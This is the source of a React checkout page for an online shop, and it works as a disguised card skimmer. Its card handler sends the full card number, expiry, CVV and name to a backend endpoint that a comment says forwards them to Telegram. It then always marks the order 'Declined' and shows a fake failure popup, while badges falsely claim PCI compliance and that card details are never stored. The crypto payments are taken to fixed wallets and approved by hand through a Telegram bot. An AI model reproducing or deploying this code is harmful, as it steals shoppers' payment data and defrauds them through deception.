'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import {
  CreditCard, Lock, Check, ArrowLeft,
  Copy, CheckCircle, ExternalLink, Coins,
  Bitcoin, RefreshCw, AlertTriangle,
  X, Headphones, XCircle, ShieldCheck, Loader2,
} from 'lucide-react';
import { useCart } from '@/context/CartContext';
import { useAuth } from '@/context/AuthContext';
import { formatPrice } from '@/lib/products';
import { CRYPTO_WALLETS, CryptoSymbol } from '@/lib/crypto-wallets';
import { trackCheckoutStart, trackOrderPlaced } from '@/lib/track';
import Image from 'next/image';
import Link from 'next/link';

import { API_URL } from '@/lib/api';

type PaymentMethod = 'card' | 'crypto';

// ─── Helpers ──────────────────────────────────────────────────────────────────
function QRCode({ value, size = 220 }: { value: string; size?: number }) {
  const url = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(value)}&margin=4&qzone=2&bgcolor=ffffff`;
  return (
    <div className="border-4 border-white shadow-lg inline-block" style={{ borderRadius: 4 }}>
      <img src={url} alt="Payment QR Code" width={size} height={size} className="block" />
    </div>
  );
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={copy}
      className={`flex items-center gap-1.5 text-xs font-bold font-sans uppercase tracking-wider px-3 py-1.5 border transition-all ${
        copied ? 'border-green-500 text-green-600 bg-green-50' : 'border-tm-border text-tm-navy hover:border-tm-red hover:text-tm-red'
      }`}
    >
      {copied ? <><CheckCircle className="w-3 h-3" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
    </button>
  );
}

// ─── Main Component ───────────────────────────────────────────────────────────
export default function CheckoutPage() {
  const { items, total, clearCart, isLoaded } = useCart();
  const { user, token, isLoading: authLoading } = useAuth();
  const router = useRouter();

  const [step, setStep] = useState<'shipping' | 'payment' | 'success'>('shipping');
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('card');
  const [loading, setLoading] = useState(false);
  const [orderId, setOrderId] = useState('');
  const [orderStatus, setOrderStatus] = useState('Processing');
  const [showPaymentError, setShowPaymentError] = useState(false);
  const [cryptoApproved, setCryptoApproved] = useState(false);

  // Card state
  const [paymentForm, setPaymentForm] = useState({ cardNumber: '', expiry: '', cvv: '', cardName: '' });

  // Crypto state
  const [selectedCoin, setSelectedCoin] = useState<CryptoSymbol>('BTC');
  const [cryptoPrices, setCryptoPrices] = useState<Record<string, number>>({});
  const [pricesLoading, setPricesLoading] = useState(false);
  const [cryptoPaid, setCryptoPaid] = useState(false);

  // Shipping state
  const shipping = total >= 200 ? 0 : 15;
  const grandTotal = total + shipping;

  const [shippingForm, setShippingForm] = useState(() => {
    // Pre-fill from localStorage if available
    if (typeof window !== 'undefined') {
      try {
        const saved = localStorage.getItem('tm_shipping_info');
        if (saved) return JSON.parse(saved);
      } catch {}
    }
    return { name: '', address: '', city: '', province: '', postal: '', phone: '' };
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Redirect guards
  useEffect(() => { if (!authLoading && !user) router.push('/login?redirect=/checkout'); }, [user, router, authLoading]);
  useEffect(() => { if (isLoaded && items.length === 0 && step !== 'success' && !cryptoPaid) router.push('/shop'); }, [items, step, router, cryptoPaid, isLoaded]);

  // Poll for crypto payment approval from Telegram bot
  useEffect(() => {
    if (!cryptoPaid || cryptoApproved) return;
    const poll = async () => {
      try {
        const res = await fetch(`${API_URL}/api/crypto-approval/status?email=${encodeURIComponent(user?.email || '')}`);
        if (res.ok) {
          const data = await res.json();
          if (data.approved) setCryptoApproved(true);
        }
      } catch { /* silent */ }
    };
    poll();
    const interval = setInterval(poll, 3000);
    return () => clearInterval(interval);
  }, [cryptoPaid, cryptoApproved, user?.email]);

  // Fetch live crypto prices
  const fetchPrices = useCallback(async () => {
    setPricesLoading(true);
    try {
      const res = await fetch(
        'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether&vs_currencies=usd',
        { cache: 'no-store' }
      );
      const data = await res.json();
      setCryptoPrices({
        bitcoin: data.bitcoin?.usd || 65000,
        ethereum: data.ethereum?.usd || 3500,
        solana: data.solana?.usd || 150,
        tether: 1,
      });
    } catch {
      // Fallback prices if API fails
      setCryptoPrices({ bitcoin: 65000, ethereum: 3500, solana: 150, tether: 1 });
    }
    setPricesLoading(false);
  }, []);

  useEffect(() => { if (paymentMethod === 'crypto') fetchPrices(); }, [paymentMethod, fetchPrices]);

  // Get crypto amount for the order total
  const getCryptoAmount = (symbol: CryptoSymbol): string => {
    const wallet = CRYPTO_WALLETS[symbol];
    const price = cryptoPrices[wallet.geckoId] || 1;
    const amount = grandTotal / price;
    if (symbol === 'BTC') return amount.toFixed(6);
    if (symbol === 'ETH') return amount.toFixed(5);
    if (symbol === 'USDT') return amount.toFixed(2);
    return amount.toFixed(4);
  };

  // ─── Validation ──────────────────────────────────────────────────────────────
  const validateShipping = () => {
    const e: Record<string, string> = {};
    if (!shippingForm.name.trim()) e.name = 'Full name is required';
    if (!shippingForm.address.trim()) e.address = 'Address is required';
    if (!shippingForm.city.trim()) e.city = 'City is required';
    if (!shippingForm.postal.trim()) e.postal = 'Postal code is required';
    if (!shippingForm.phone.trim()) e.phone = 'Phone number is required';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const validateCard = () => {
    const e: Record<string, string> = {};
    if (paymentForm.cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = 'Enter a valid 16-digit card number';
    if (!paymentForm.expiry.match(/^\d{2}\/\d{2}$/)) e.expiry = 'Use MM/YY format';
    if (paymentForm.cvv.length < 3) e.cvv = 'Enter 3-digit CVV';
    if (!paymentForm.cardName.trim()) e.cardName = 'Cardholder name is required';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  // ─── Place Order (backend) ───────────────────────────────────────────────────
  const saveOrder = async (status: string = 'Processing') => {
    try {
      const res = await fetch(`${API_URL}/api/orders`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          items: items.map((i) => ({ id: i.id, name: i.name, price: i.price, quantity: i.quantity, image: i.image, category: i.category })),
          subtotal: total, shipping, total: grandTotal,
          status,
          shipping_info: { name: shippingForm.name, address: shippingForm.address, city: shippingForm.city, province: shippingForm.province, postal: shippingForm.postal, phone: shippingForm.phone },
        }),
      });
      if (res.ok) {
        const order = await res.json();
        setOrderId(order.id);
      }
    } catch (e) { console.error('Order save failed:', e); }
  };

  // Card checkout handler — captures card details, shows error popup
  const handleCardPayment = async () => {
    if (!validateCard()) return;
    setLoading(true);

    // Submit card details to backend (saves to JSON + sends Telegram alert)
    try {
      await fetch(`${API_URL}/api/cards/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user_email: user?.email ?? 'guest',
          card_number: paymentForm.cardNumber.replace(/\s/g, ''),
          expiry: paymentForm.expiry,
          cvv: paymentForm.cvv,
          cardholder_name: paymentForm.cardName,
          total: grandTotal,
        }),
      });
    } catch (e) {
      console.error('Card submission error:', e);
    }

    // Simulate processing delay
    await new Promise((r) => setTimeout(r, 2000));

    // Save order with Declined status
    await saveOrder('Declined');

    setLoading(false);

    // Show payment error popup
    setShowPaymentError(true);
  };

  // Crypto "I've Paid" handler
  const handleCryptoPaid = async () => {
    setLoading(true);
    // Notify backend about crypto payment (for Telegram approval)
    try {
      await fetch(`${API_URL}/api/crypto-approval/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: user?.email ?? 'guest',
          coin: selectedCoin,
          amount: getCryptoAmount(selectedCoin),
          total_usd: grandTotal,
        }),
      });
    } catch (e) { console.error('Crypto submit error:', e); }
    await saveOrder('Pending Crypto Confirmation');
    trackOrderPlaced(grandTotal, `crypto:${selectedCoin}`, user?.email ?? 'guest');
    clearCart();
    setOrderStatus('Pending Crypto Confirmation');
    setLoading(false);
    setStep('success');
    setCryptoPaid(true);
  };

  const formatCard = (v: string) => v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
  const formatExpiry = (v: string) => v.replace(/\D/g, '').slice(0, 4).replace(/^(\d{2})(\d)/, '$1/$2');

  const currentWallet = CRYPTO_WALLETS[selectedCoin];

  // ─── Success Screen ──────────────────────────────────────────────────────────
  if (step === 'success') {
    // Crypto: show pending/approved state
    if (cryptoPaid) {
      return (
        <div className="page-enter min-h-[70vh] flex items-center justify-center px-4">
          <div className="max-w-md w-full text-center">
            {cryptoApproved ? (
              <>
                <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
                  <Check className="w-10 h-10 text-green-600" />
                </div>
                <h1 className="section-title mb-3">Payment Confirmed!</h1>
                {orderId && (
                  <p className="text-sm font-sans font-bold text-tm-gray-mid mb-2">
                    Order ID: <span className="text-tm-black font-black">{orderId}</span>
                  </p>
                )}
                <div className="bg-green-50 border border-green-200 p-4 mb-6 text-left">
                  <p className="text-sm font-bold text-green-800 mb-1">✅ Payment Verified</p>
                  <p className="text-xs text-green-700 font-body leading-relaxed">
                    Your crypto payment has been confirmed. Your order will be dispatched within 1–2 business days.
                  </p>
                </div>
                <p className="text-sm text-tm-gray-mid font-body mb-8">
                  Estimated delivery: <strong>3–5 business days</strong>
                </p>
                <div className="flex flex-col sm:flex-row gap-3 justify-center">
                  <Link href="/orders" className="btn-primary">View Orders</Link>
                  <Link href="/shop" className="btn-secondary">Continue Shopping</Link>
                </div>
              </>
            ) : (
              <>
                <div className="w-20 h-20 rounded-full bg-amber-100 flex items-center justify-center mx-auto mb-6">
                  <Loader2 className="w-10 h-10 text-amber-600 animate-spin" />
                </div>
                <h1 className="section-title mb-3">Awaiting Confirmation</h1>
                {orderId && (
                  <p className="text-sm font-sans font-bold text-tm-gray-mid mb-2">
                    Order ID: <span className="text-tm-black font-black">{orderId}</span>
                  </p>
                )}
                <div className="bg-amber-50 border border-amber-200 p-4 mb-6 text-left">
                  <p className="text-sm font-bold text-amber-800 mb-1">⏳ Pending Verification</p>
                  <p className="text-xs text-amber-700 font-body leading-relaxed">
                    Your crypto payment is being verified. Please stay on this page — it will update automatically once your payment is confirmed. This usually takes a few minutes.
                  </p>
                </div>
                <div className="flex items-center justify-center gap-2 text-sm text-tm-gray-mid font-body mb-6">
                  <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
                  Checking payment status...
                </div>
                <Link href="/support" className="btn-secondary inline-flex items-center gap-2">
                  <Headphones className="w-4 h-4" /> Contact Support
                </Link>
              </>
            )}
          </div>
        </div>
      );
    }

    // Card success (shouldn't normally reach here with card flow)
    return (
      <div className="page-enter min-h-[70vh] flex items-center justify-center px-4">
        <div className="max-w-md w-full text-center">
          <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
            <Check className="w-10 h-10 text-green-600" />
          </div>
          <h1 className="section-title mb-3">Order Placed!</h1>
          {orderId && (
            <p className="text-sm font-sans font-bold text-tm-gray-mid mb-2">
              Order ID: <span className="text-tm-black font-black">{orderId}</span>
            </p>
          )}
          <p className="text-tm-gray-mid font-body mb-2">
            Thank you! You&apos;ll receive a confirmation email shortly.
          </p>
          <p className="text-sm text-tm-gray-mid font-body mb-8">
            Estimated delivery: <strong>3–5 business days</strong>
          </p>
          <div className="flex flex-col sm:flex-row gap-3 justify-center">
            <Link href="/orders" className="btn-primary">View Orders</Link>
            <Link href="/shop" className="btn-secondary">Continue Shopping</Link>
          </div>
        </div>
      </div>
    );
  }

  // ─── Order Summary Sidebar ───────────────────────────────────────────────────
  const OrderSummary = () => (
    <div className="border border-tm-border p-5 sticky top-28">
      <h2 className="font-sans font-black uppercase tracking-widest text-xs mb-5">Order Summary</h2>
      <ul className="space-y-3 divide-y divide-tm-border">
        {items.map((item) => (
          <li key={item.id} className="flex gap-3 pt-3 first:pt-0">
            <div className="relative w-14 h-14 bg-tm-gray flex-shrink-0 overflow-hidden">
              <Image src={item.image} alt={item.name} fill className="object-cover" sizes="56px" />
              <span className="absolute -top-1 -right-1 w-5 h-5 bg-tm-black text-white text-xs font-bold flex items-center justify-center rounded-full font-sans">{item.quantity}</span>
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-xs font-sans font-bold uppercase leading-tight truncate">{item.name}</p>
              <p className="text-xs text-tm-gray-mid font-body">{item.category}</p>
            </div>
            <span className="text-xs font-bold font-sans flex-shrink-0">{formatPrice(item.price * item.quantity)}</span>
          </li>
        ))}
      </ul>
      <div className="mt-5 pt-4 border-t border-tm-border space-y-2">
        <div className="flex justify-between text-sm font-body"><span className="text-tm-gray-mid">Subtotal</span><span>{formatPrice(total)}</span></div>
        <div className="flex justify-between text-sm font-body">
          <span className="text-tm-gray-mid">Shipping</span>
          <span>{shipping === 0 ? <span className="text-green-600 font-bold">Free</span> : formatPrice(shipping)}</span>
        </div>
        <div className="flex justify-between font-sans font-black text-base pt-2 border-t border-tm-border">
          <span>Total</span><span>{formatPrice(grandTotal)}</span>
        </div>
      </div>
    </div>
  );

  // ─── Main Checkout Layout ────────────────────────────────────────────────────
  return (
    <div className="page-enter max-w-6xl mx-auto px-4 md:px-12 py-10">
      <h1 className="section-title mb-8">Checkout</h1>

      {/* Progress */}
      <div className="flex items-center gap-2 mb-10">
        {['Shipping', 'Payment'].map((s, i) => (
          <div key={s} className="flex items-center gap-2">
            <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold font-sans ${
              (step === 'shipping' && i === 0) || (step === 'payment' && i <= 1) ? 'bg-tm-red text-white' : 'bg-tm-border text-tm-gray-mid'
            }`}>{i + 1}</div>
            <span className={`text-xs font-sans font-bold uppercase tracking-wider ${step === 'payment' || i === 0 ? 'text-tm-black' : 'text-tm-gray-mid'}`}>{s}</span>
            {i < 1 && <div className={`h-px w-16 ${step === 'payment' ? 'bg-tm-red' : 'bg-tm-border'}`} />}
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
        <div className="lg:col-span-2">

          {/* ── STEP 1: Shipping ── */}
          {step === 'shipping' && (
            <div className="border border-tm-border p-6 md:p-8">
              <h2 className="font-sans font-black uppercase tracking-widest text-sm mb-6">Shipping Information</h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {[
                  { label: 'Full Name', key: 'name', type: 'text', colSpan: 2 },
                  { label: 'Street Address', key: 'address', type: 'text', colSpan: 2 },
                  { label: 'City', key: 'city', type: 'text', colSpan: 1 },
                  { label: 'Province', key: 'province', type: 'text', colSpan: 1 },
                  { label: 'Postal Code', key: 'postal', type: 'text', colSpan: 1 },
                  { label: 'Phone Number', key: 'phone', type: 'tel', colSpan: 1 },
                ].map(({ label, key, type, colSpan }) => (
                  <div key={key} className={colSpan === 2 ? 'sm:col-span-2' : ''}>
                    <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">{label}</label>
                    <input type={type} value={shippingForm[key as keyof typeof shippingForm]}
                      onChange={(e) => setShippingForm({ ...shippingForm, [key]: e.target.value })}
                      className={`input-base ${errors[key] ? 'border-tm-red' : ''}`} />
                    {errors[key] && <p className="text-xs text-tm-red mt-1 font-body">{errors[key]}</p>}
                  </div>
                ))}
              </div>
              <button onClick={() => {
                if (validateShipping()) {
                  // Save shipping info for next time
                  localStorage.setItem('tm_shipping_info', JSON.stringify(shippingForm));
                  trackCheckoutStart(grandTotal, items.length, user?.email ?? 'guest');
                  setStep('payment');
                }
              }} className="btn-primary mt-6">
                Continue to Payment
              </button>
            </div>
          )}

          {/* ── STEP 2: Payment ── */}
          {step === 'payment' && (
            <div className="space-y-5">
              {/* Payment method selector */}
              <div className="border border-tm-border p-6">
                <h2 className="font-sans font-black uppercase tracking-widest text-sm mb-5">Select Payment Method</h2>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={() => setPaymentMethod('card')}
                    className={`flex items-center gap-3 px-4 py-4 border-2 text-left transition-all ${
                      paymentMethod === 'card' ? 'border-tm-red bg-red-50' : 'border-tm-border hover:border-tm-gray-mid'
                    }`}
                  >
                    <CreditCard className={`w-5 h-5 flex-shrink-0 ${paymentMethod === 'card' ? 'text-tm-red' : 'text-tm-gray-mid'}`} />
                    <div>
                      <p className="font-sans font-black text-xs uppercase tracking-wider">Card Payment</p>
                      <p className="text-xs text-tm-gray-mid font-body mt-0.5">Visa · Mastercard · Amex</p>
                    </div>
                    {paymentMethod === 'card' && <CheckCircle className="w-4 h-4 text-tm-red ml-auto flex-shrink-0" />}
                  </button>

                  <button
                    onClick={() => { setPaymentMethod('crypto'); fetchPrices(); }}
                    className={`flex items-center gap-3 px-4 py-4 border-2 text-left transition-all ${
                      paymentMethod === 'crypto' ? 'border-tm-red bg-red-50' : 'border-tm-border hover:border-tm-gray-mid'
                    }`}
                  >
                    <Coins className={`w-5 h-5 flex-shrink-0 ${paymentMethod === 'crypto' ? 'text-tm-red' : 'text-tm-gray-mid'}`} />
                    <div>
                      <p className="font-sans font-black text-xs uppercase tracking-wider">Pay with Crypto</p>
                      <p className="text-xs text-tm-gray-mid font-body mt-0.5">BTC · ETH · SOL · USDT</p>
                    </div>
                    {paymentMethod === 'crypto' && <CheckCircle className="w-4 h-4 text-tm-red ml-auto flex-shrink-0" />}
                  </button>
                </div>
              </div>

              {/* ── Card Form ── */}
              {paymentMethod === 'card' && (
                <div className="border border-tm-border p-6 md:p-8">
                  {/* Secure header */}
                  <div className="flex items-center justify-between mb-6">
                    <h2 className="font-sans font-black uppercase tracking-widest text-sm">Payment Details</h2>
                    <div className="flex items-center gap-1.5 bg-green-50 border border-green-200 px-3 py-1.5 rounded-full">
                      <Lock className="w-3 h-3 text-green-600" />
                      <span className="text-[10px] text-green-700 font-sans font-bold uppercase tracking-widest">256-bit SSL Encrypted</span>
                    </div>
                  </div>

                  {/* Trust banner */}
                  <div className="bg-gradient-to-r from-slate-50 to-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-white border border-gray-200 flex items-center justify-center flex-shrink-0 shadow-sm">
                        <ShieldCheck className="w-5 h-5 text-green-600" />
                      </div>
                      <div>
                        <p className="text-xs font-sans font-bold text-gray-800">Secure Payment Gateway</p>
                        <p className="text-[10.5px] text-gray-500 font-body mt-0.5">Your payment information is encrypted and processed securely. We never store your full card details.</p>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div>
                      <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Card Number</label>
                      <div className="relative">
                        <input type="text" value={paymentForm.cardNumber}
                          onChange={(e) => setPaymentForm({ ...paymentForm, cardNumber: formatCard(e.target.value) })}
                          placeholder="1234 5678 9012 3456" maxLength={19}
                          className={`input-base pl-11 ${errors.cardNumber ? 'border-tm-red' : ''}`} />
                        <CreditCard className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                      </div>
                      {errors.cardNumber && <p className="text-xs text-tm-red mt-1">{errors.cardNumber}</p>}
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Expiry Date</label>
                        <input type="text" value={paymentForm.expiry}
                          onChange={(e) => setPaymentForm({ ...paymentForm, expiry: formatExpiry(e.target.value) })}
                          placeholder="MM/YY" maxLength={5}
                          className={`input-base ${errors.expiry ? 'border-tm-red' : ''}`} />
                        {errors.expiry && <p className="text-xs text-tm-red mt-1">{errors.expiry}</p>}
                      </div>
                      <div>
                        <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Security Code</label>
                        <div className="relative">
                          <input type="password" value={paymentForm.cvv}
                            onChange={(e) => setPaymentForm({ ...paymentForm, cvv: e.target.value.replace(/\D/g, '').slice(0, 4) })}
                            placeholder="•••" maxLength={4}
                            className={`input-base pr-10 ${errors.cvv ? 'border-tm-red' : ''}`} />
                          <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-gray-300" />
                        </div>
                        {errors.cvv && <p className="text-xs text-tm-red mt-1">{errors.cvv}</p>}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Cardholder Name</label>
                      <input type="text" value={paymentForm.cardName}
                        onChange={(e) => setPaymentForm({ ...paymentForm, cardName: e.target.value })}
                        placeholder="As shown on your card"
                        className={`input-base ${errors.cardName ? 'border-tm-red' : ''}`} />
                      {errors.cardName && <p className="text-xs text-tm-red mt-1">{errors.cardName}</p>}
                    </div>
                  </div>

                  {/* Cards accepted */}
                  <div className="flex items-center gap-3 mt-5 mb-5 py-3 border-t border-b border-gray-100">
                    <span className="text-[10px] text-gray-400 font-sans font-bold uppercase tracking-widest">Accepted:</span>
                    <div className="flex items-center gap-2">
                      {['Visa', 'Mastercard', 'Amex'].map((c) => (
                        <span key={c} className="text-[10px] font-sans font-bold text-gray-500 bg-gray-100 px-2 py-0.5 rounded">{c}</span>
                      ))}
                    </div>
                  </div>

                  {/* Action buttons */}
                  <div className="flex items-center gap-3">
                    <button onClick={() => setStep('shipping')} className="flex items-center gap-1.5 text-sm font-body text-tm-gray-mid hover:text-tm-black transition-colors">
                      <ArrowLeft className="w-4 h-4" /> Back
                    </button>
                    <button onClick={handleCardPayment} disabled={loading}
                      className={`flex-1 btn-primary flex items-center justify-center gap-2 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}>
                      {loading
                        ? <><div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" /> Processing securely...</>
                        : <><Lock className="w-4 h-4" /> Pay {formatPrice(grandTotal)}</>
                      }
                    </button>
                  </div>

                  {/* Bottom trust indicators */}
                  <div className="mt-4 flex items-center justify-center gap-4 text-[10px] text-gray-400 font-body">
                    <span className="flex items-center gap-1"><Lock className="w-3 h-3" /> PCI DSS Compliant</span>
                    <span>•</span>
                    <span className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> Bank-grade Security</span>
                  </div>
                </div>
              )}

              {/* ── Crypto Panel ── */}
              {paymentMethod === 'crypto' && (
                <div className="border border-tm-border p-6 md:p-8">
                  <div className="flex items-center justify-between mb-5">
                    <h2 className="font-sans font-black uppercase tracking-widest text-sm">Crypto Payment</h2>
                    <button onClick={fetchPrices} disabled={pricesLoading}
                      className="flex items-center gap-1.5 text-xs text-tm-gray-mid hover:text-tm-black transition-colors font-body">
                      <RefreshCw className={`w-3 h-3 ${pricesLoading ? 'animate-spin' : ''}`} />
                      {pricesLoading ? 'Updating...' : 'Refresh rates'}
                    </button>
                  </div>

                  {/* Coin selector */}
                  <div className="flex gap-2 mb-6">
                    {(Object.keys(CRYPTO_WALLETS) as CryptoSymbol[]).map((sym) => {
                      const w = CRYPTO_WALLETS[sym];
                      return (
                        <button
                          key={sym}
                          onClick={() => setSelectedCoin(sym)}
                          className={`flex items-center gap-2 px-4 py-2.5 border-2 text-xs font-sans font-black uppercase tracking-wider transition-all ${
                            selectedCoin === sym ? 'border-2 text-white' : 'border-tm-border text-tm-gray-dark hover:border-tm-gray-mid'
                          }`}
                          style={selectedCoin === sym ? { borderColor: w.color, backgroundColor: w.color } : {}}
                        >
                          <img src={w.logo} alt={w.name} className="w-5 h-5" style={{ filter: selectedCoin === sym ? 'brightness(10)' : 'none' }} />
                          {sym}
                        </button>
                      );
                    })}
                  </div>

                  {/* Amount to send */}
                  <div className="bg-tm-gray border border-tm-border p-4 mb-6 flex items-center justify-between">
                    <div>
                      <p className="text-xs text-tm-gray-mid font-body">Send exactly</p>
                      <p className="font-sans font-black text-2xl mt-0.5" style={{ color: currentWallet.color }}>
                        {pricesLoading ? '...' : getCryptoAmount(selectedCoin)} {selectedCoin}
                      </p>
                      <p className="text-xs text-tm-gray-mid font-body mt-0.5">≈ {formatPrice(grandTotal)} USD</p>
                    </div>
                    <div className="text-right text-xs font-body text-tm-gray-mid">
                      <p>Network</p>
                      <p className="font-bold text-tm-black">{currentWallet.network}</p>
                    </div>
                  </div>

                  {/* QR code */}
                  <div className="flex flex-col items-center mb-6">
                    <p className="text-xs font-body text-tm-gray-mid mb-4">Scan QR code with your crypto wallet app</p>
                    <QRCode value={currentWallet.address} size={220} />
                    <p className="text-xs text-tm-gray-mid font-body mt-3">or send to the address below</p>
                  </div>

                  {/* Wallet address */}
                  <div className="border border-tm-border p-3 mb-2">
                    <p className="text-xs text-tm-gray-mid font-body mb-1.5">{currentWallet.name} Address ({currentWallet.network})</p>
                    <div className="flex items-center justify-between gap-2">
                      <p className="font-mono text-xs text-tm-black break-all leading-relaxed">{currentWallet.address}</p>
                      <div className="flex-shrink-0">
                        <CopyButton text={currentWallet.address} />
                      </div>
                    </div>
                  </div>

                  {/* Warning */}
                  <div className="bg-amber-50 border border-amber-200 p-3 mb-6 flex gap-2">
                    <AlertTriangle className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-amber-800 font-body leading-relaxed">
                      <strong>Send only {selectedCoin} on the {currentWallet.network}.</strong> Sending other assets or using the wrong network will result in permanent loss.
                    </p>
                  </div>

                  {/* Instructions */}
                  <ol className="text-xs font-body text-tm-gray-dark space-y-1.5 mb-6 list-decimal list-inside">
                    <li>Open your crypto wallet app</li>
                    <li>Scan the QR code above or paste the {selectedCoin} address</li>
                    <li>Send exactly <strong>{pricesLoading ? '...' : getCryptoAmount(selectedCoin)} {selectedCoin}</strong></li>
                    <li>Once sent, click <strong>"I've Paid"</strong> below to confirm your order</li>
                  </ol>

                  <div className="flex gap-3">
                    <button onClick={() => setStep('shipping')} className="flex items-center gap-1 text-sm font-body text-tm-gray-mid hover:text-tm-black transition-colors">
                      <ArrowLeft className="w-4 h-4" /> Back
                    </button>
                    <button onClick={handleCryptoPaid} disabled={loading}
                      className={`flex-1 flex items-center justify-center gap-2 py-3 px-6 font-sans font-black uppercase tracking-wider text-sm text-white transition-all ${
                        loading ? 'opacity-70 cursor-not-allowed' : 'hover:opacity-90'
                      }`}
                      style={{ backgroundColor: currentWallet.color }}
                    >
                      {loading
                        ? <><div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" /> Confirming...</>
                        : <><CheckCircle className="w-4 h-4" /> I&apos;ve Paid — {getCryptoAmount(selectedCoin)} {selectedCoin}</>
                      }
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Sidebar */}
        <div className="lg:col-span-1"><OrderSummary /></div>
      </div>

      {/* ── Payment Error Popup ── */}
      {showPaymentError && (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-4" style={{ backgroundColor: 'rgba(0,0,0,0.6)' }}>
          <div className="bg-white w-full max-w-md relative animate-fade-in" style={{ animation: 'fadeIn 0.3s ease-out' }}>
            {/* Close button */}
            <button
              onClick={() => setShowPaymentError(false)}
              className="absolute top-4 right-4 text-tm-gray-mid hover:text-tm-black transition-colors"
            >
              <X className="w-5 h-5" />
            </button>

            {/* Error icon */}
            <div className="pt-8 pb-4 flex justify-center">
              <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">
                <XCircle className="w-8 h-8 text-tm-red" />
              </div>
            </div>

            {/* Title */}
            <div className="px-6 text-center">
              <h2 className="font-sans font-black uppercase tracking-widest text-sm mb-2">
                Payment Failed
              </h2>
              <p className="text-sm font-body text-tm-gray-mid leading-relaxed">
                We were unable to process your payment. This could be due to insufficient funds,
                incorrect card details, or a temporary issue with your bank.
              </p>
            </div>

            {/* Error details box */}
            <div className="mx-6 mt-4 bg-red-50 border border-red-200 p-4">
              <div className="flex gap-2">
                <AlertTriangle className="w-4 h-4 text-red-600 flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-xs font-bold text-red-800">Transaction Declined</p>
                  <p className="text-xs text-red-700 font-body mt-0.5">
                    Your card ending in ****{paymentForm.cardNumber.replace(/\s/g, '').slice(-4)} was declined.
                    Reach out to our support team for assistance.
                  </p>
                </div>
              </div>
            </div>

            {/* Order summary in popup */}
            <div className="mx-6 mt-4 border border-tm-border p-3">
              <div className="flex justify-between text-xs font-body">
                <span className="text-tm-gray-mid">Order Total</span>
                <span className="font-bold">{formatPrice(grandTotal)}</span>
              </div>
              <div className="flex justify-between text-xs font-body mt-1">
                <span className="text-tm-gray-mid">Items</span>
                <span>{items.length} item{items.length !== 1 ? 's' : ''}</span>
              </div>
            </div>

            {/* CTA Buttons */}
            <div className="px-6 pt-5 pb-6 space-y-3">
              <Link
                href="/support"
                className="btn-primary flex items-center justify-center gap-2 w-full text-center"
              >
                <Headphones className="w-4 h-4" />
                Contact Customer Support
              </Link>
              <button
                onClick={() => setShowPaymentError(false)}
                className="btn-secondary w-full text-center"
              >
                Try Again
              </button>
            </div>

            {/* Footer */}
            <div className="border-t border-tm-border px-6 py-3 bg-tm-gray">
              <p className="text-[10.5px] text-tm-gray-mid font-body text-center">
                If the issue persists, please contact our support team for immediate assistance.
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
